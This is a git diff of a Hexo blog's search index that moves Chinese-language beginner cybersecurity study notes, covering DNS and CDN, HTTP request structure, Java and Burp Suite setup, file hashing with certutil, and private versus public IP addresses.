 <p>dns与cdn的关系<br>刚才说到cdn实际上是一个就近访问，那么现在有一个问题是，我们怎么知道用户的所在位置从而给他分配最佳的cdn节点呢。这就需要dns服务来进行定位了。当我们通过使用dns服务的时候，可以根据他使用的LDNS服务器来进行一个定位，例如我们的调度服务器看到他是来自深圳电信的LDNS服务器，那么我们就认为该用户来自深圳电信，然后调度服务器可以让该用户去访问深圳电信的CDN服务器，这样就让用户访问到了最优的cdn节点。<br>通过dns服务我们可以很快的定位到用户的位置，然后给用户分配最佳cdn节点，但是这种调度方式存在一个问题，例如，当我 是北京联通的用户但是使用的却是深圳电信的ldns的话，调度服务器会给我分配到深圳电信的cdn服务器，这样就产生了错误的调度。</p>
 <h1 id="网站程序产生漏洞："><a href="#网站程序产生漏洞：" class="headerlink" title="网站程序产生漏洞："></a>网站程序产生漏洞：</h1><p>SQL注入，文件上传，xss，代码执行，变量覆盖，逻辑漏洞，反序列化。</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结三</title>
+    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
+    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
+<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
+<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
+<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
+<span id="more"></span>
+
+<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
+<p>然后输入命令</p>
+<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
+<p>如</p>
+<p>certutil -hashfile  webpro.war MD5</p>
+<p>注意后面有个MD5,不然会生成一个其他的值。</p>
+]]></content>
+      <categories>
+        <category>网安基础篇</category>
+      </categories>
+      <tags>
+        <tag>web基础</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>网安基础总结二</title>
+    <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
+    <content><![CDATA[<p><strong>本周重点</strong></p>
+<p><strong>1.学习进展</strong></p>
+<p>1.完成burpsuite的安装以及java环境的配置。</p>
+<p>2.完成对http协议的学习以及对url，web前端的一些浅显的了解。</p>
+<p>3.了解了公网ip和内网ip的区别.</p>
+<span id="more"></span>
+
+<p><strong>2.遗留问题</strong></p>
+<p>​        <strong>1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。</strong></p>
+<p>​         <strong>2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。</strong></p>
+<p><strong>3.下周计划</strong></p>
+<p>1.学习数据库基础</p>
+<p>2.学习SQL基础</p>
+<p>3.学习MySQL部署与使用</p>
+<p><strong>4.思考总结</strong></p>
+<p>​         <strong>首先总结一下burpsuite的安装与Java环境的配置！</strong></p>
+<p><strong>1.首先找到系统设置中的高级系统设置，点击环境变量。</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062708-feae412f-7908-4f68-ba33-568ff1651b65.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062309-ab8cf4dd-78dc-42d6-8c55-a47e3cedadfa.gif" alt="img"></p>
+<p><strong>2.找到系统变量path设置</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062542-7e15a7f3-0076-4b0f-8c92-1ca5a60fa4f6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062311-b40a5d85-b7bc-497d-953d-f3efb211d2ed.gif" alt="img"></p>
+<p><strong>3.点击并编辑两条新的文本</strong></p>
+<p>%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062302-c19e5f59-de13-4cb6-8981-8291facc8652.gif" alt="img"></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062817-a06cd932-0656-4e3b-9bd1-ca7960eb396c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062872-b4fb976d-c5fa-44da-9ffd-2791761c576f.gif" alt="img"></p>
+<p><strong>4.添加新的系统变量JAVA_HOME</strong></p>
+<p>变量值是jdk的安装路径。</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062938-cd99e78e-4be7-4026-91e8-552b03b1cee6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063259-9af407bf-8cf7-42ea-ba47-33d2ea98f103.gif" alt="img"></p>
+<p><strong>5.添加CLASSPATH这个新的系统变量</strong></p>
+<p>变量值是 </p>
+<p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063917-b33286fc-1178-46ab-b6dd-7acab372a840.gif" alt="img"></p>
+<p>切记，最前方有  .；</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366063982-e583a5d7-21c3-4073-8b27-fd7c18617131.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064047-80a7e79e-fc19-4e04-8db4-6f86203c3184.gif" alt="img"></p>
+<p><strong>6.配置完成后点击确定。</strong></p>
+<p><strong>7.在cmd命令中输入java -version和javac -version</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366064353-75e1c6b8-34aa-4ca2-974f-7cd94ea171a2.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064407-b4ff7bdc-d542-42f5-b1da-6eba6d7c0c4b.gif" alt="img"></p>
+<p>若出现版本号，则Java环境配置成功。</p>
+<p>后面的burpsuite安装过程很简单，这里不细讲。</p>
+<hr>
+<p>​                          <strong>第二，总结一下http协议</strong></p>
+<p><strong>Request请求数据包</strong></p>
+<p>HTTP规划定义了8种可能的请求方法:</p>
+<p>1 GET:检索URL中标识资源的一个简单请求</p>
+<p>2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档</p>
+<p>3 POST: 服务器接受被写入客户端输出流中的数据的请求</p>
+<p>4PUT:服务器保存请求数据作为指定URI新内容的请求</p>
+<p>5DELETE:服务器删除URL中命令的资源的请求</p>
+<p>6OPTIONS:关于服务器支持的请求方法信息的请求</p>
+<p>7 TRACE: web服务器反馈Http请求和其头标的请求</p>
+<p>8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</p>
+<p>例如：</p>
+<p>请求行     GET /index.html HTTP/1.1</p>
+<p>请求方法：GET    请求url：index.html   HTTP版本：HTTP/1.1</p>
+<p>​                                                                                                       <strong>划重点！！！</strong></p>
+<p><strong>下面用chrome浏览器对某一网页进行检查</strong></p>
+<p>我们随便进入一个网页如下图</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366519046-3e22d4cb-35a5-43a4-8fff-bb784d430c7d.png" alt="img"></p>
+<p>然后点击network</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366577455-cf0bf193-ab72-4cf7-b541-79a51ecd6e63.png" alt="img"></p>
+<p>按住ctrl+r</p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366610192-8c8d1065-d648-4a5c-9db6-ccae8fdc9937.png" alt="img"></p>
+<p>就可以得到这一网站里的内容，<strong>这就类似于burp suite的抓包</strong></p>
+<p><strong>我们看一下请求数据包request header</strong></p>
+<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366748992-dd527888-897e-48e3-8fd8-67789024a49d.png" alt="img"></p>
+<p>可以清楚的看到，他的请求数据包里的<strong>请求行</strong>是GET————一直到HTTP/1.1</p>
+<p>GET后的一大串内容则是检索URL中的标识资源。</p>
+<p><em><strong>我们说一下url的组成</strong></em></p>
+<p>URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例<a href="https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG">https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG</a></p>
+<p> 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。<br>第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com<br>第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的</p>
+<p>staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG  </p>
+<p><strong>我的理解：</strong></p>
+<p><strong>1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置</strong></p>
+<p> <strong>2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。</strong></p>
+<p> <strong>3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。</strong></p>
+<p> <strong>4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是</strong>toc_node_uuid=w9bQEpfPpVSSY8SG               </p>
+<p>请求头：</p>
+<p>1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。</p>
+<p>2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</p>
+<p>3.User-Agent: 是客户浏览器名称</p>
+<p>4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。</p>
+<p>5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。</p>
+<p>6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p>
+<p>7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是<a href="http://hostname:8080/icconcept">http://hostname:8080/icconcept</a> /index.jsp.</p>
+<p>8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。</p>
+<p>9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1.</p>
+<p>10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。</p>
+<p>空行</p>
+<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
+<p>请求数据</p>
+<p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
+<p><strong>Response返回数据包数据格式</strong></p>
+<p>1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
+<p>2.响应头标:包含服务器类型、日期、长度、内容类型等</p>
+<p>3.空行:响应头与响应体之间用空行隔开</p>
+<p>4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</p>
+<p>HTTP响应码:</p>
+<p>1xx: 信息，请求收到，继续处理</p>
+<p>2xx: 成功，行为被成功地接受、理解和采纳</p>
+<p>3xx: 重定向，为了完成请求，必须进一步执行的动作</p>
+<p>4xx:客户端错误</p>
+<p>5xx:服务器错误</p>
+<p>200 存在文件</p>
+<p>403 存在文件夹</p>
+<p>3xx 均可能存在</p>
+<p>404 不存在文件及文件夹</p>
+<p>500 均可能存在</p>
+<hr>
+<p>​                             <em><strong>第三.内网ip和公网ip</strong></em></p>
+<p>内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射）</p>
+<p>公网IP：互联网IP地址。</p>
+<p>IP地址就像家庭地址一样，公网IP是小区地址，小区中又有很多住户，内网ip就像你家具体的门牌号，你可以从小区里出去（内网ip能连接到互联网），但是外人进入你家需要进行验证（公网IP无法直接连接到内网ip）<br>具体操作<br>用邮寄系统作比喻。有公网ip，相当于说你有一个详细的地址，你可以写信寄给别人，别人也可以用这个地址和你进行各种通讯。<br>来看看没有公网ip是一种什么局面。这就像是住在一个大院里 ，所有进出邮件都由传达室转交。如果是普通的邮件，可以放在传达室，传达室的大爷大妈看到你了就会转交给你，或者你自己去传达室看看，这不重要，反正虽然经过了一点波折，还是可以看到邮件的。假设以下如果来了个挂号，邮局的人员说：必须本人签收。传达室的大爷就说了：对不起，所有的邮件都要经过我中转~。于是邮局的人员只好把信带回去了……<br>实际情况和这个差不多，所谓没有公网ip，就是说你的机子并非直接连接上internet，而是所有通讯经过一台代理（一般是透明网关）进行中转，这时候问题就来了，就会有一些通讯无法在这种机制下顺利进行。比如两个网吧之间，网吧的机子是没有公网 ip的典型例子，通常两个网吧之间通过QQ传送文件就不是直接两台机器建立连接传输的，而是通过QQ的公网服务器进行中转传输了。又比如没有公网ip，上网玩对战游戏通常会有问题，你建立的游戏别人无法加入等等，当然通过服务提供商的公网服务器中转还是可以达成两个没有公网IP的机器进行交流的。</p>
+<hr>
+<p>​       <strong>第四：使用burp suite时浏览器的代理设置。</strong></p>
+<p><strong>1.火狐浏览器安装插件</strong></p>
+<h1 id="FoxyProxy-标准版"><a href="#FoxyProxy-标准版" class="headerlink" title="FoxyProxy 标准版"></a>FoxyProxy 标准版</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370687313-39151ef7-4f02-4207-b095-7bc7f2a593f8.png" alt="img"></p>
+<p>2.Edge浏览器安装插件</p>
+<h1 id="Proxy-SwitchyOmega"><a href="#Proxy-SwitchyOmega" class="headerlink" title="Proxy SwitchyOmega"></a>Proxy SwitchyOmega</h1><p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651370760581-fdf5355f-64a6-4b92-afdc-51d4c5a7198a.png" alt="img"></p>
+<p>什么时候用就打开。</p>
+<ul>
+<li><strong>注：平常安装的burp suite只能抓取   http://   不能抓取   https://</strong></li>
+</ul>
 ]]></content>
       <categories>
         <category>网安基础篇</category>
@@ -2130,161 +2285,6 @@ include('files/'.$action.'.php'); //载入相应文件
 <p>差不多就这些，以后再做补充。</p>
 <h2 id="三、下周计划"><a href="#三、下周计划" class="headerlink" title="三、下周计划"></a>三、下周计划</h2><p>下周主攻MISC，学一下python脚本编写。副攻web中的命令执行和php特性这类题目。</p>
 <p>加油(ง •_•)ง</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结三</title>
-    <url>/2022/05/08/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%B8%89/</url>
-    <content><![CDATA[<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><p>1.cms指纹识别在线识别</p>
-<p>[BugScaner]<a href="http://whatweb.bugscaner.com/look/]">http://whatweb.bugscaner.com/look/</a></p>
-<p>[云悉指纹]<a href="http://www.yunsee.cn/finger.html]">http://www.yunsee.cn/finger.html</a></p>
-<p>[whatweb]<a href="https://whatweb.net/]">https://whatweb.net/</a> </p>
-<span id="more"></span>
-
-<p>2.在<a href="https://so.csdn.net/so/search?q=cmd&spm=1001.2101.3001.7020">cmd</a>下进入 要查看的文件目录</p>
-<p>然后输入命令</p>
-<p>certutil -hashfile  文件名称.文件类型 <a href="https://so.csdn.net/so/search?q=MD5&spm=1001.2101.3001.7020">MD5</a></p>
-<p>如</p>
-<p>certutil -hashfile  webpro.war MD5</p>
-<p>注意后面有个MD5,不然会生成一个其他的值。</p>
-]]></content>
-      <categories>
-        <category>网安基础篇</category>
-      </categories>
-      <tags>
-        <tag>web基础</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>网安基础总结二</title>
-    <url>/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/</url>
-    <content><![CDATA[<p><strong>本周重点</strong></p>
-<p><strong>1.学习进展</strong></p>
-<p>1.完成burpsuite的安装以及java环境的配置。</p>
-<p>2.完成对http协议的学习以及对url，web前端的一些浅显的了解。</p>
-<p>3.了解了公网ip和内网ip的区别.</p>
-<span id="more"></span>
-
-<p><strong>2.遗留问题</strong></p>
-<p>​        <strong>1.内网IP与公网IP的联系和区别是什么。内网IP是不是有很多，而公网IP只有几个或者是某些内网IP连接一个公网IP。</strong></p>
-<p>​         <strong>2.自己电脑上设置的IP地址会不会与别人的IP地址想冲突，导致自己上不了网。</strong></p>
-<p><strong>3.下周计划</strong></p>
-<p>1.学习数据库基础</p>
-<p>2.学习SQL基础</p>
-<p>3.学习MySQL部署与使用</p>
-<p><strong>4.思考总结</strong></p>
-<p>​         <strong>首先总结一下burpsuite的安装与Java环境的配置！</strong></p>
-<p><strong>1.首先找到系统设置中的高级系统设置，点击环境变量。</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062708-feae412f-7908-4f68-ba33-568ff1651b65.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062309-ab8cf4dd-78dc-42d6-8c55-a47e3cedadfa.gif" alt="img"></p>
-<p><strong>2.找到系统变量path设置</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062542-7e15a7f3-0076-4b0f-8c92-1ca5a60fa4f6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062311-b40a5d85-b7bc-497d-953d-f3efb211d2ed.gif" alt="img"></p>
-<p><strong>3.点击并编辑两条新的文本</strong></p>
-<p>%JAVA_HOME%\bin %JAVA_HOME%\jre\bin</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062302-c19e5f59-de13-4cb6-8981-8291facc8652.gif" alt="img"></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062817-a06cd932-0656-4e3b-9bd1-ca7960eb396c.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366062872-b4fb976d-c5fa-44da-9ffd-2791761c576f.gif" alt="img"></p>
-<p><strong>4.添加新的系统变量JAVA_HOME</strong></p>
-<p>变量值是jdk的安装路径。</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366062938-cd99e78e-4be7-4026-91e8-552b03b1cee6.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063259-9af407bf-8cf7-42ea-ba47-33d2ea98f103.gif" alt="img"></p>
-<p><strong>5.添加CLASSPATH这个新的系统变量</strong></p>
-<p>变量值是 </p>
-<p>.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar</p>
-<p><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366063917-b33286fc-1178-46ab-b6dd-7acab372a840.gif" alt="img"></p>
-<p>切记，最前方有  .；</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366063982-e583a5d7-21c3-4073-8b27-fd7c18617131.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064047-80a7e79e-fc19-4e04-8db4-6f86203c3184.gif" alt="img"></p>
-<p><strong>6.配置完成后点击确定。</strong></p>
-<p><strong>7.在cmd命令中输入java -version和javac -version</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366064353-75e1c6b8-34aa-4ca2-974f-7cd94ea171a2.png" alt="img"><img src="https://cdn.nlark.com/yuque/0/2022/gif/27996677/1651366064407-b4ff7bdc-d542-42f5-b1da-6eba6d7c0c4b.gif" alt="img"></p>
-<p>若出现版本号，则Java环境配置成功。</p>
-<p>后面的burpsuite安装过程很简单，这里不细讲。</p>
-<hr>
-<p>​                          <strong>第二，总结一下http协议</strong></p>
-<p><strong>Request请求数据包</strong></p>
-<p>HTTP规划定义了8种可能的请求方法:</p>
-<p>1 GET:检索URL中标识资源的一个简单请求</p>
-<p>2HEAD:与GET方法相同， 服务器只返回状态行和头标，并不返回请求文档</p>
-<p>3 POST: 服务器接受被写入客户端输出流中的数据的请求</p>
-<p>4PUT:服务器保存请求数据作为指定URI新内容的请求</p>
-<p>5DELETE:服务器删除URL中命令的资源的请求</p>
-<p>6OPTIONS:关于服务器支持的请求方法信息的请求</p>
-<p>7 TRACE: web服务器反馈Http请求和其头标的请求</p>
-<p>8 CONNECT :已文档化，但当前未实现的一个方法，预留做隧道处理</p>
-<p>例如：</p>
-<p>请求行     GET /index.html HTTP/1.1</p>
-<p>请求方法：GET    请求url：index.html   HTTP版本：HTTP/1.1</p>
-<p>​                                                                                                       <strong>划重点！！！</strong></p>
-<p><strong>下面用chrome浏览器对某一网页进行检查</strong></p>
-<p>我们随便进入一个网页如下图</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366519046-3e22d4cb-35a5-43a4-8fff-bb784d430c7d.png" alt="img"></p>
-<p>然后点击network</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366577455-cf0bf193-ab72-4cf7-b541-79a51ecd6e63.png" alt="img"></p>
-<p>按住ctrl+r</p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366610192-8c8d1065-d648-4a5c-9db6-ccae8fdc9937.png" alt="img"></p>
-<p>就可以得到这一网站里的内容，<strong>这就类似于burp suite的抓包</strong></p>
-<p><strong>我们看一下请求数据包request header</strong></p>
-<p><img src="/2022/05/01/%E7%BD%91%E5%AE%89%E5%9F%BA%E7%A1%80%E6%80%BB%E7%BB%93%E4%BA%8C/1651366748992-dd527888-897e-48e3-8fd8-67789024a49d.png" alt="img"></p>
-<p>可以清楚的看到，他的请求数据包里的<strong>请求行</strong>是GET————一直到HTTP/1.1</p>
-<p>GET后的一大串内容则是检索URL中的标识资源。</p>
-<p><em><strong>我们说一下url的组成</strong></em></p>
-<p>URL简单来说就是输入地址栏里的一大串网址，按此网页的地址栏内的网址为例<a href="https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG">https://ayitsec.yuque.com/staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG</a></p>
-<p> 第一部分是url方案，方案可以告知web客户端要怎么访问资源。这里是https://，也就是https协议。常见的还有http、ftp等。<br>第二部分指定服务器的位置，这部分告知web客户端资源的位置。例子中是ayitsec.yuque.com<br>第三部分是资源路径，路径说明了资源在服务器的位置。也即是例子中的</p>
-<p>staff-pfl4l5/mbv8b5/uhfr4z/edit?toc_node_uuid=w9bQEpfPpVSSY8SG  </p>
-<p><strong>我的理解：</strong></p>
-<p><strong>1.请求行下面的都是请求头，其中HOST请求头里面的内容则是url中的第二部分——指定服务器位置</strong></p>
-<p> <strong>2.我们说的http协议有八种请求方法，其中最常用的两种请求方法是get与post。</strong></p>
-<p> <strong>3.GET请求把参数放在url中，POST请求通过request body传递参数（也就是空行下的那一行）。而且GET请求对url中传送的参数有长度限制，而POST 则没有长度限制。</strong></p>
-<p> <strong>4.GET请求里，请求行中‘？’分割实际的url和参数，‘&amp;’是url指定的参数间的分隔符。所以，我们的例子中的参数就是</strong>toc_node_uuid=w9bQEpfPpVSSY8SG               </p>
-<p>请求头：</p>
-<p>1.HOST：主机或域名地址。对应网址URL中的Web名称和端口号。</p>
-<p>2.Accept:指浏览器或其他客户可以接爱的MIME文件格式。Servlet可以根据它判断并返回适当的文件格式。</p>
-<p>3.User-Agent: 是客户浏览器名称</p>
-<p>4.Accept-Langeuage: 指出浏览器可以接受的语言种类，如en或en-us， 指英语。</p>
-<p>5.connection: 用来告诉服务器是否可以维持固定的HTTP连接。http是无连接的，HTTP/1.1使用Keep-Alive为默认值， 这样，当浏览器需要多个文件时(比如一个HTML文件和相关的图形文件)，不需要每次都建立连接。（HTTP 1.1默认进行持久连接），它就可以利用持久连接的优点。</p>
-<p>6 Cookie: 浏览器用这个属性向服务器发送Cookie。Cookie是在浏览器中寄存的小型数据体，它可以记载和服务器相关的用户信息，也可以用来实现会话功能。</p>
-<p>7 Referer: 表明产生请求的网页URL。 如比从网页/ icconcept/ index. jsp中点击一个链接到网页/icwork/ search，在向服务器发送的GET/icwork/ search中的请求中，Referer是<a href="http://hostname:8080/icconcept">http://hostname:8080/icconcept</a> /index.jsp.</p>
-<p>8 Content-Type: 用来表名request的内容类型。可以用HttpServletRequest的getContentType ()方法取得。</p>
-<p>9 Accept-Charset: 指出浏览器可以接受的字符编码。英文浏览器的默认值是IS0-8859-1.</p>
-<p>10 Accept-Encoding: 指出浏览器可以接受的编码方式。编码方式不同于文件格式，它是为了压缩文件并加速文件传递速度。浏览器在接收到web响应之后先解码，然后再检查文件格式。</p>
-<p>空行</p>
-<p>最后一个请求头标之后是空行，发送回车符和退行，通知服务器以下不再有头标。</p>
-<p>请求数据</p>
-<p>使用POST传送，最常使用的是Content-Type和Content-Length头标</p>
-<p><strong>Response返回数据包数据格式</strong></p>
-<p>1.状态行：协议版本，数字形式的状态代码和状态描述，个元素之间以空格分隔</p>
-<p>2.响应头标:包含服务器类型、日期、长度、内容类型等</p>
-<p>3.空行:响应头与响应体之间用空行隔开</p>
-<p>4.响应数据:浏览器会将实体内容中的数据取出来，生成相应的页面</p>
-<p>HTTP响应码:</p>
-<p>1xx: 信息，请求收到，继续处理</p>
-<p>2xx: 成功，行为被成功地接受、理解和采纳</p>
-<p>3xx: 重定向，为了完成请求，必须进一步执行的动作</p>
-<p>4xx:客户端错误</p>
-<p>5xx:服务器错误</p>
-<p>200 存在文件</p>
-<p>403 存在文件夹</p>
-<p>3xx 均可能存在</p>
-<p>404 不存在文件及文件夹</p>
-<p>500 均可能存在</p>
-<hr>
-<p>​                             <em><strong>第三.内网ip和公网ip</strong></em></p>
-<p>内网ip：路由器以内的网络。可以连接互联网，但是互联网无法直接连接内网（需要端口映射）</p>
-<p>公网IP：互联网IP地址。</p>
